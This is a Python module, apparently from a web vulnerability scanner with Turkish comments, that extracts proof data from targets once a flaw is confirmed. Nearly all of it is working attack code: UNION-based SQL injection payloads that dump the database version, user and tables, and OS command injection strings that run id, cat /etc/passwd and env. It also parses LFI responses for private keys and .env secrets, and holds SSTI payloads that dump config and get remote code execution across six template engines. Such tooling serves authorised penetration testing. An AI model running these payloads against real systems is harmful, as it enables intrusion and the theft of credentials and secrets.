"""
websecure.core.evidence_extractor
-----------------------------------
Merkezi sandwich-marker tabanlı gerçek veri yakalama motoru.

Her saldırı türü için:
  - Payload içine @@WSST@@ / @@WSEN@@ başlangıç+bitiş işareti gömer
  - Response body'de işaretler arasındaki ham veriyi çeker
  - Yapılandırılmış dict döner  →  report_finding extra= alanına gider
  - Raporda / terminalde okunabilir çıktı üretir

Sözlük tabanlı keyword eşleşmesi YOK — hedef sistemin gerçek cevabı yakalanır.
"""
from __future__ import annotations

import re
import logging
from typing import Any, Callable, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Evrensel sandwich işaretleri
# Hedef platformdan bağımsız, alfanümerik olmayan çakışma riski çok düşük.
# ---------------------------------------------------------------------------
MARK_S = "@@WSST@@"   # start
MARK_E = "@@WSEN@@"   # end
_MARK_RE = re.compile(re.escape(MARK_S) + r"(.*?)" + re.escape(MARK_E), re.DOTALL)

# CMDi için ayrı işaret (shell echo'dan geçebilen daha kısa format)
CMD_MARK_S = "WSCST9"
CMD_MARK_E = "WCEN9"
_CMD_RE    = re.compile(re.escape(CMD_MARK_S) + r"(.*?)" + re.escape(CMD_MARK_E), re.DOTALL)


# ---------------------------------------------------------------------------
# Yardımcı
# ---------------------------------------------------------------------------

def extract_marked(text: str) -> Optional[str]:
    """@@WSST@@...@@WSEN@@ arasındaki ilk eşleşmeyi döner, yoksa None."""
    m = _MARK_RE.search(text)
    return m.group(1).strip() if m else None


def extract_cmd_marked(text: str) -> Optional[str]:
    """WSCST9...WCEN9 arasındaki ilk eşleşmeyi döner (CMDi shell işareti)."""
    m = _CMD_RE.search(text)
    return m.group(1).strip() if m else None


def build_marked_expr(sql_expr: str, quote: str = "'") -> str:
    """SQL ifadesini sandwich marker'larla sarar; tek tırnak uyumlu format."""
    # Örn: build_marked_expr("version()") →
    #   '@@WSST@@'||version()||'@@WSEN@@'   (MySQL/PostgreSQL/SQLite concat)
    return f"{quote}{MARK_S}{quote}||{sql_expr}||{quote}{MARK_E}{quote}"


def build_marked_expr_mssql(sql_expr: str) -> str:
    """MSSQL CONCAT uyumlu format."""
    return f"CONCAT('{MARK_S}',{sql_expr},'{MARK_E}')"


# ---------------------------------------------------------------------------
# SQL Injection — gerçek veri yakalama
# ---------------------------------------------------------------------------

class SQLiEvidenceExtractor:
    """
    Union-based SQLi onaylandıktan sonra hedef sistemden gerçek veri çeker.
    Çalışma prensibi:
      1. Marker içeren SELECT sorgusunu gönder
      2. Response'ta @@WSST@@...@@WSEN@@ arasındaki değeri oku
      3. Sürüm, kullanıcı, veritabanı adı, tablo listesi döner
    """

    _VERSION_QUERIES: Dict[str, str] = {
        "mysql":      "version()",
        "mssql":      "@@VERSION",
        "postgresql": "version()",
        "sqlite":     "sqlite_version()",
        "oracle":     "v$version.BANNER",
    }

    _USER_QUERIES: Dict[str, str] = {
        "mysql":      "user()",
        "mssql":      "SYSTEM_USER",
        "postgresql": "current_user",
        "sqlite":     "'sqlite_user'",
        "oracle":     "USER",
    }

    _DB_QUERIES: Dict[str, str] = {
        "mysql":      "database()",
        "mssql":      "DB_NAME()",
        "postgresql": "current_database()",
        "sqlite":     "'main'",
        "oracle":     "ORA_DATABASE_NAME",
    }

    # Tablo listesi — marker ile sarılacak
    _TABLE_QUERIES_RAW: Dict[str, str] = {
        "mysql": (
            "GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR '|') "
            "FROM information_schema.tables WHERE table_schema=database()"
        ),
        "mssql": (
            "STRING_AGG(table_name,'|') "
            "FROM information_schema.tables"
        ),
        "postgresql": (
            "STRING_AGG(table_name,'|') "
            "FROM information_schema.tables WHERE table_schema='public'"
        ),
        "sqlite": (
            "GROUP_CONCAT(name,'|') "
            "FROM sqlite_master WHERE type='table'"
        ),
    }

    def _send(
        self,
        url: str,
        param: str,
        sql_select_expr: str,
        cols: int,
        quote: str,
        session: Any,
        inject_fn: Callable,
        db_hint: str,
        timeout: int = 10,
    ) -> Optional[str]:
        """Marker'lı UNION SELECT gönderir; yanıt içinden değeri çeker."""
        null_cols = ["NULL"] * cols
        if db_hint == "mssql":
            null_cols[0] = build_marked_expr_mssql(sql_select_expr)
            payload = f"{quote} UNION SELECT {','.join(null_cols)}-- -"
        else:
            null_cols[0] = build_marked_expr(sql_select_expr, quote)
            payload = f"{quote} UNION SELECT {','.join(null_cols)}-- -"
        try:
            resp = session.get(inject_fn(url, param, payload), timeout=timeout)
            return extract_marked(resp.text or "")
        except Exception as exc:
            logger.debug("[EvidenceExtractor.SQLi] send error: %r", exc)
            return None

    def _send_table_query(
        self,
        url: str,
        param: str,
        raw_from: str,
        cols: int,
        quote: str,
        session: Any,
        inject_fn: Callable,
        db_hint: str,
        timeout: int = 12,
    ) -> Optional[str]:
        """Tablo listesi için SELECT expr FROM ... biçimini gönderir."""
        null_cols = ["NULL"] * cols
        if db_hint == "mssql":
            null_cols[0] = f"CONCAT('{MARK_S}',{raw_from},'{MARK_E}')"
            payload = f"{quote} UNION SELECT {','.join(null_cols)}-- -"
        else:
            null_cols[0] = f"'{MARK_S}'||({raw_from})||'{MARK_E}'"
            payload = f"{quote} UNION SELECT {','.join(null_cols)}-- -"
        try:
            resp = session.get(inject_fn(url, param, payload), timeout=timeout)
            return extract_marked(resp.text or "")
        except Exception as exc:
            logger.debug("[EvidenceExtractor.SQLi] table-query error: %r", exc)
            return None

    def extract(
        self,
        url: str,
        param: str,
        session: Any,
        inject_fn: Callable,
        cols: int,
        quote: str,
        db_hint: str = "mysql",
    ) -> Dict[str, Any]:
        """
        Ana extraction metodu. Dönen dict:
        {
          "db_version":    "11.4.3-MariaDB",
          "db_user":       "root@localhost",
          "db_name":       "dvwa",
          "tables":        ["users", "guestbook", ...],
          "sensitive_tables": ["users"],
          "db_hint":       "mysql",
          "cols":          2,
        }
        """
        result: Dict[str, Any] = {"db_hint": db_hint, "cols": cols}

        ver_expr = self._VERSION_QUERIES.get(db_hint, "version()")
        usr_expr = self._USER_QUERIES.get(db_hint, "user()")
        db_expr  = self._DB_QUERIES.get(db_hint, "database()")

        version = self._send(url, param, ver_expr, cols, quote, session, inject_fn, db_hint)
        if version:
            result["db_version"] = version
            logger.info("[EvidenceExtractor.SQLi] db_version=%r", version)

        user = self._send(url, param, usr_expr, cols, quote, session, inject_fn, db_hint)
        if user:
            result["db_user"] = user
            logger.info("[EvidenceExtractor.SQLi] db_user=%r", user)

        dbname = self._send(url, param, db_expr, cols, quote, session, inject_fn, db_hint)
        if dbname:
            result["db_name"] = dbname
            logger.info("[EvidenceExtractor.SQLi] db_name=%r", dbname)

        raw_tbl = self._TABLE_QUERIES_RAW.get(db_hint)
        if raw_tbl:
            raw_val = self._send_table_query(
                url, param, raw_tbl, cols, quote, session, inject_fn, db_hint
            )
            if raw_val:
                tables = [t.strip() for t in raw_val.split("|") if t.strip()]
                result["tables"] = tables
                _SENS = re.compile(
                    r"(?i)(user|account|admin|member|customer|password|passwd|"
                    r"secret|credential|token|api_key|config|session|auth|login|email)"
                )
                result["sensitive_tables"] = [t for t in tables if _SENS.search(t)]
                logger.info(
                    "[EvidenceExtractor.SQLi] tables=%d sensitive=%d",
                    len(tables), len(result["sensitive_tables"]),
                )

        return result

    def format_summary(self, data: Dict[str, Any]) -> str:
        """Terminal / rapor için okunabilir özet satırı üretir."""
        parts: List[str] = []
        if data.get("db_version"):
            parts.append(f"DB: {data['db_version']}")
        if data.get("db_user"):
            parts.append(f"User: {data['db_user']}")
        if data.get("db_name"):
            parts.append(f"Schema: {data['db_name']}")
        tbls = data.get("tables", [])
        if tbls:
            shown = tbls[:8]
            extra = len(tbls) - len(shown)
            tbl_str = ", ".join(shown) + (f" (+{extra} more)" if extra else "")
            parts.append(f"Tables[{len(tbls)}]: {tbl_str}")
        sens = data.get("sensitive_tables", [])
        if sens:
            parts.append(f"[!] Sensitive: {', '.join(sens)}")
        return " | ".join(parts) if parts else ""


# ---------------------------------------------------------------------------
# OS Command Injection — gerçek komut çıktısı yakalama
# ---------------------------------------------------------------------------

class CMDiEvidenceExtractor:
    """
    Sandwich marker ile hedef sistemden gerçek komut çıktısı çeker.
    Normal CMDIRCEChain'in üzerine inşa edilir; marker sayesinde
    sayfa gürültüsünden bağımsız şekilde çıktıyı izole eder.
    """

    _UNIX_CMDS: List[Tuple[str, str]] = [
        ("id",                  "unix_id"),
        ("whoami",              "unix_whoami"),
        ("uname -a",            "unix_uname"),
        ("hostname",            "unix_hostname"),
        ("cat /etc/passwd",     "unix_passwd"),
        ("env",                 "unix_env"),
        ("ip a 2>/dev/null || ifconfig 2>/dev/null", "unix_net"),
    ]

    _WIN_CMDS: List[Tuple[str, str]] = [
        ("whoami",              "win_whoami"),
        ("echo %USERNAME%",     "win_username"),
        ("systeminfo",          "win_sysinfo"),
        ("ipconfig",            "win_ipconfig"),
    ]

    _INJECT_FMTS: List[str] = [
        "; echo {s}$({cmd}){e}",        # unix subshell
        "; echo {s}$(\\{cmd}){e}",      # escaped subshell
        "| echo {s}$({cmd}){e}",        # pipe subshell
        "; printf '{s}'; {cmd}; printf '{e}'",  # printf sandwich
        "%0a echo {s}$({cmd}){e}",      # newline
        "& echo {s}{cmd}{e}",           # windows — cmd placeholder, not used
    ]

    def extract(
        self,
        url: str,
        param: str,
        session: Any,
        baseline_text: str = "",
        timeout: int = 12,
    ) -> Optional[Dict[str, Any]]:
        """
        Marker'lı echo ile gerçek komut çıktısını çeker.
        Dönen dict:
        {
          "command": "id",
          "raw_output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
          "uid": "33",
          "username": "www-data",
          "technique": "unix_subshell",
          "payload": "; echo WSCST9$(id)WCEN9",
        }
        """
        from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
        parsed = urlparse(url)
        qs = parse_qsl(parsed.query)

        for cmd, technique in self._UNIX_CMDS + self._WIN_CMDS:
            for fmt in self._INJECT_FMTS:
                # Windows cmd placeholder → yalnız win_ için dene
                if "{cmd}" in fmt and "win_" in technique and "$()" in fmt:
                    continue
                if "win_" in technique and "printf" in fmt:
                    continue
                payload = fmt.format(s=CMD_MARK_S, cmd=cmd, e=CMD_MARK_E)
                new_qs = [(p, v + payload if p == param else v) for p, v in qs]
                test_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
                try:
                    resp = session.get(test_url, timeout=timeout)
                    text = resp.text or ""
                    raw = extract_cmd_marked(text)
                    if raw and raw not in baseline_text:
                        result: Dict[str, Any] = {
                            "command":   cmd,
                            "raw_output": raw[:500],
                            "technique": technique,
                            "payload":   payload,
                        }
                        # Unix id çıktısını parse et
                        uid_m = re.search(r"uid=(\d+)\((\w+)\)", raw)
                        if uid_m:
                            result["uid"]      = uid_m.group(1)
                            result["username"] = uid_m.group(2)
                        gid_m = re.search(r"gid=(\d+)\((\w+)\)", raw)
                        if gid_m:
                            result["gid"]       = gid_m.group(1)
                            result["gid_name"]  = gid_m.group(2)
                        groups_m = re.findall(r"\((\w[\w-]*)\)", raw)
                        if groups_m:
                            result["groups"] = groups_m
                        logger.info(
                            "[EvidenceExtractor.CMDi] command=%r uid=%s user=%s",
                            cmd, result.get("uid"), result.get("username"),
                        )
                        return result
                except Exception as exc:
                    logger.debug("[EvidenceExtractor.CMDi] error: %r", exc)
                    continue
        return None

    def format_summary(self, data: Dict[str, Any]) -> str:
        parts: List[str] = []
        if data.get("username"):
            parts.append(f"User: {data['username']} (uid={data.get('uid', '?')})")
        if data.get("groups"):
            parts.append(f"Groups: {', '.join(data['groups'][:5])}")
        if data.get("raw_output"):
            snippet = data["raw_output"][:120].replace("\n", " ")
            parts.append(f"Output: {snippet}")
        return " | ".join(parts) if parts else ""


# ---------------------------------------------------------------------------
# LFI — dosya içeriği yapılandırılmış çıkarma
# ---------------------------------------------------------------------------

class LFIEvidenceExtractor:
    """
    LFI teyit edildikten sonra dosya içeriğini yapılandırılmış şekilde çeker.
    """

    _FILE_SIGNATURES: List[Tuple[str, str, str]] = [
        # (pattern, dosya türü, açıklama)
        (r"root:.*:0:0:",              "passwd",   "/etc/passwd"),
        (r"\[extensions\]",            "win_ini",  "C:\\Windows\\win.ini"),
        (r"127\.0\.0\.1\s+localhost",  "hosts",    "/etc/hosts"),
        (r"Linux version \d",          "proc_ver", "/proc/version"),
        (r"#!/bin/(ba)?sh",            "script",   "shell script"),
        (r"SERVER_SOFTWARE=\S",        "environ",  "/proc/self/environ"),
        (r"DOCUMENT_ROOT=\S",          "environ",  "/proc/self/environ"),
        (r"-----BEGIN.*PRIVATE KEY",   "ssh_key",  "private key"),
        (r"mysql.*innodb",             "mysql_conf", "MySQL config"),
        (r"\[database\]",              "db_conf",  "database config"),
        (r"password\s*=",              "cred_file","credentials file"),
        (r"API_KEY\s*=|SECRET_KEY\s*=","env_file", ".env file"),
    ]

    def extract(self, body: str, file_path: str = "") -> Dict[str, Any]:
        """
        LFI response body'sinden yapılandırılmış veri çıkarır.
        Dönen dict:
        {
          "file_type":     "passwd",
          "file_desc":     "/etc/passwd",
          "signature":     "root:x:0:0:",
          "lines_total":   42,
          "snippet":       "root:x:0:0:root:/root:/bin/bash\n...",
          "users":         ["root", "www-data", "mysql"],     # passwd'dan
          "sensitive_keys": ["password=secret"],              # config'den
        }
        """
        result: Dict[str, Any] = {"file_path": file_path}

        for pattern, ftype, fdesc in self._FILE_SIGNATURES:
            m = re.search(pattern, body, re.I | re.S)
            if m:
                result["file_type"] = ftype
                result["file_desc"] = fdesc
                result["signature"] = m.group(0)[:80]
                break

        lines = body.splitlines()
        result["lines_total"] = len(lines)

        # İlk 10 anlamlı satırı snippet olarak al
        meaningful = [l for l in lines if l.strip()][:10]
        result["snippet"] = "\n".join(meaningful)

        # /etc/passwd → kullanıcı listesi çıkar
        if result.get("file_type") == "passwd":
            users = re.findall(r"^(\w[\w-]*):", body, re.M)
            result["users"] = users[:20]
            # shell erişimi olanlar
            shell_users = re.findall(r"^(\w[\w-]*):[^:]*:[^:]*:[^:]*:[^:]*:[^:]*:/bin/[a-z]+sh", body, re.M)
            if shell_users:
                result["shell_users"] = shell_users

        # .env / config → hassas anahtar/değer çiftleri
        if result.get("file_type") in ("env_file", "cred_file", "db_conf"):
            sens_pairs = re.findall(
                r"(?i)((?:password|secret|api_?key|token|passwd)[^=\n]*=[^\n]{1,80})",
                body
            )
            if sens_pairs:
                result["sensitive_keys"] = sens_pairs[:10]

        # /proc/self/environ → ortam değişkenleri
        if result.get("file_type") == "environ":
            env_pairs = re.findall(r"([A-Z_]{2,}=[^\x00\n]{1,100})", body)
            result["env_vars"] = env_pairs[:20]

        logger.info(
            "[EvidenceExtractor.LFI] type=%r lines=%d snippet_len=%d",
            result.get("file_type"), result.get("lines_total", 0),
            len(result.get("snippet", "")),
        )
        return result

    def format_summary(self, data: Dict[str, Any]) -> str:
        parts: List[str] = []
        if data.get("file_desc"):
            parts.append(f"File: {data['file_desc']}")
        if data.get("lines_total"):
            parts.append(f"Lines: {data['lines_total']}")
        if data.get("users"):
            shown = data["users"][:5]
            parts.append(f"Users: {', '.join(shown)}")
        if data.get("shell_users"):
            parts.append(f"[!] Shell users: {', '.join(data['shell_users'])}")
        if data.get("sensitive_keys"):
            parts.append(f"[!] Credentials found: {len(data['sensitive_keys'])} key(s)")
        if data.get("env_vars"):
            parts.append(f"Env vars: {len(data['env_vars'])} found")
        return " | ".join(parts) if parts else ""


# ---------------------------------------------------------------------------
# SSTI — template evaluation gerçek çıktı yakalama
# ---------------------------------------------------------------------------

class SSTIEvidenceExtractor:
    """
    SSTI teyit edildikten sonra template engine'in gerçek çıktısını yakalar.
    Matematik canary zaten doğrulama için kullanılıyor;
    bu sınıf ek olarak config dump ve RCE çıktısını yakalamak için marker kullanır.
    """

    _ENGINE_CONFIG_PAYLOADS: Dict[str, List[Tuple[str, str]]] = {
        "Jinja2": [
            ("{{config}}", r"<Config|SECRET_KEY|DEBUG|SQLALCHEMY"),
            ("{{config.items()}}", r"SECRET_KEY|DEBUG|DATABASE"),
            ("{{self.__dict__}}", r"_TemplateReference|environ"),
        ],
        "Twig": [
            ("{{_self.env}}", r"Twig_Environment|loader|cache"),
            ("{{dump(app)}}", r"Symfony|kernel|debug"),
        ],
        "FreeMarker": [
            ("${.data_model}", r"freemarker|BeansWrapper"),
            ("${.globals}", r"freemarker|global"),
        ],
        "Smarty": [
            ("{$smarty.version}", r"\d+\.\d+\.\d+"),
            ("{php}phpinfo();{/php}", r"php.*version|System|Build"),
        ],
    }

    # RCE PoC payload'ları — gerçek komut çıktısı
    _RCE_PAYLOADS: Dict[str, List[str]] = {
        "Jinja2": [
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{'id'|popen|read}}",
            "{{''.__class__.__mro__[2].__subclasses__()[132].__init__.__globals__['popen']('id').read()}}",
        ],
        "Twig": [
            "{{['id']|filter('system')}}",
            "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
        ],
        "FreeMarker": [
            '${"freemarker.template.utility.Execute"?new()("id")}',
            "${\"freemarker.template.utility.JythonRuntime\"?new()?eval(\"import os; os.popen('id').read()\")}",
        ],
        "Mako": [
            "${__import__('os').popen('id').read()}",
        ],
        "ERB": [
            "<%= `id` %>",
            "<%= system('id') %>",
        ],
        "Velocity": [
            "#set($e='')\n#set($e.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke($e.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id'))",
        ],
    }

    _RCE_OUTPUT_RE = re.compile(
        r"uid=\d+\(\w+\)\s+gid=\d+"
        r"|root:.*?:0:0:"
        r"|www-data|apache|nginx"
        r"|Microsoft Windows"
        r"|Linux \S+",
        re.I,
    )

    def extract_config(
        self,
        url: str,
        param: str,
        session: Any,
        inject_fn: Callable,
        engine: str,
        timeout: int = 10,
    ) -> Optional[Dict[str, Any]]:
        """Engine config / context dump'ını yakalar."""
        payloads = self._ENGINE_CONFIG_PAYLOADS.get(engine, [])
        for payload, expect_re in payloads:
            try:
                resp = session.get(inject_fn(url, param, payload), timeout=timeout)
                body = resp.text or ""
                if re.search(expect_re, body, re.I | re.S):
                    # Config dump'ını al — payload ile başlayan veya özel section
                    start = body.find("<Config") if "<Config" in body else 0
                    snippet = body[start:start + 600].strip()
                    # SECRET_KEY gibi hassas değerleri bul
                    secrets = re.findall(
                        r"(?i)(SECRET_KEY|DEBUG|DATABASE_URL|SQLALCHEMY_DATABASE)['\"\s:=]+([^\s,}\]'\"]{1,80})",
                        snippet,
                    )
                    result: Dict[str, Any] = {
                        "engine": engine,
                        "config_payload": payload,
                        "config_snippet": snippet[:400],
                    }
                    if secrets:
                        result["leaked_keys"] = {k: v for k, v in secrets[:10]}
                    logger.info(
                        "[EvidenceExtractor.SSTI] config dump engine=%r secrets=%d",
                        engine, len(secrets),
                    )
                    return result
            except Exception as exc:
                logger.debug("[EvidenceExtractor.SSTI] config error: %r", exc)
        return None

    def extract_rce(
        self,
        url: str,
        param: str,
        session: Any,
        inject_fn: Callable,
        engine: str,
        baseline_text: str = "",
        timeout: int = 12,
    ) -> Optional[Dict[str, Any]]:
        """RCE PoC — gerçek komut çıktısını yakalar."""
        payloads = self._RCE_PAYLOADS.get(engine, [])
        for payload in payloads:
            try:
                resp = session.get(inject_fn(url, param, payload), timeout=timeout)
                body = resp.text or ""
                m = self._RCE_OUTPUT_RE.search(body)
                if m and m.group(0) not in baseline_text:
                    start = max(0, m.start() - 20)
                    end   = min(len(body), m.end() + 200)
                    result: Dict[str, Any] = {
                        "engine":         engine,
                        "rce_payload":    payload,
                        "rce_output":     body[start:end].strip()[:300],
                        "rce_confirmed":  True,
                    }
                    uid_m = re.search(r"uid=(\d+)\((\w+)\)", body)
                    if uid_m:
                        result["uid"]      = uid_m.group(1)
                        result["username"] = uid_m.group(2)
                    logger.info(
                        "[EvidenceExtractor.SSTI] RCE confirmed engine=%r uid=%s",
                        engine, result.get("uid"),
                    )
                    return result
            except Exception as exc:
                logger.debug("[EvidenceExtractor.SSTI] rce error: %r", exc)
        return None

    def format_summary(self, data: Dict[str, Any]) -> str:
        parts: List[str] = []
        if data.get("engine"):
            parts.append(f"Engine: {data['engine']}")
        if data.get("leaked_keys"):
            parts.append(f"[!] Config keys leaked: {', '.join(data['leaked_keys'].keys())}")
        if data.get("rce_confirmed"):
            rce_out = (data.get("rce_output") or "")[:80].replace("\n", " ")
            parts.append(f"RCE output: {rce_out}")
            if data.get("username"):
                parts.append(f"User: {data['username']} (uid={data.get('uid', '?')})")
        return " | ".join(parts) if parts else ""


# ---------------------------------------------------------------------------
# Rapor için tek ortak formatter
# ---------------------------------------------------------------------------

def format_extracted_data(finding: Dict[str, Any]) -> str:
    """
    Bir finding dict'inden extracted_data veya evidence içindeki yapılandırılmış
    veriyi okunabilir metin satırlarına dönüştürür.
    Reporting pipeline tarafından çağrılır.
    """
    ed = finding.get("extracted_data") or {}
    if not ed:
        return ""

    vuln = (finding.get("type") or finding.get("vuln_type") or "").lower()
    lines: List[str] = ["--- Extracted Evidence ---"]

    if "sqli" in vuln or "sql injection" in vuln:
        ext = SQLiEvidenceExtractor()
        s = ext.format_summary(ed)
        if s:
            lines.append(s)

    elif "command injection" in vuln or "cmdi" in vuln or "rce" in vuln:
        ext2 = CMDiEvidenceExtractor()
        s = ext2.format_summary(ed)
        if s:
            lines.append(s)

    elif "lfi" in vuln or "file inclusion" in vuln or "traversal" in vuln:
        ext3 = LFIEvidenceExtractor()
        s = ext3.format_summary(ed)
        if s:
            lines.append(s)

    elif "ssti" in vuln or "template injection" in vuln:
        ext4 = SSTIEvidenceExtractor()
        s = ext4.format_summary(ed)
        if s:
            lines.append(s)

    else:
        # Bilinmeyen tip — key/value olarak göster
        for k, v in ed.items():
            if v and k not in ("db_hint", "cols"):
                lines.append(f"  {k}: {v}")

    return "\n".join(lines) if len(lines) > 1 else ""
